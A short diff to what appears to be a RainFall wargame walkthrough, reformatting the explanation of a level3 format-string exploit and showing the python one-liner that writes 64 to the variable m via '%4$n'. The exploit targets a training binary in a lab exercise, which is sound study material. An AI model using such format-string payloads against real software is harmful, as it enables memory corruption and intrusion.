@@ -76,8 +76,8 @@ Let's break down what this exploit format string will look like. <br/>
 
 - address of ```m``` [4 bytes]
 - pad of arbitrary data [60 bytes]
-- 4$ [$ is a shortcut to specifying the argument number, in this case, argument 4 on the stack]
-- %n [writes 64 to memory at the address of m]
+- 4$ – $ is a shortcut to specifying the argument number. In this case, the 4th argument on the stack
+- %n – writes 64 to memory at the address of m
 
 ```
 level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08"+"A"*60+"%4$n"' ; cat -) | ./level3
